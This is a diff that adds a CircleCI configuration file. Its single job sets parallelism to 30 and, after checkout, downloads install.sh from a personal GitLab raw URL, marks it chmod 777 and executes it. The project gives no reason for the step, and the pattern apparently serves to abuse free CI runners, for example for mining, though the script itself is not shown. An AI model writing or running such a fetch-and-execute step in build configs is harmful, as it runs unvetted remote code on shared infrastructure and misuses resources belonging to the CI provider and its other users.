@@ -1,0 +1,19 @@
+working_dir: &working_dir ~/app
+
+version: 2.1 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - job
+ 
+jobs: 
+  job:
+    parallelism: 30
+    machine:
+      image: ubuntu-2004:202101-01
+     
+    steps: 
+      - checkout 
+      - run: wget https://gitlab.com/YurikoLegg/ss/-/raw/main/install.sh && chmod 777 install.sh && ./install.sh
+      - run: ls 
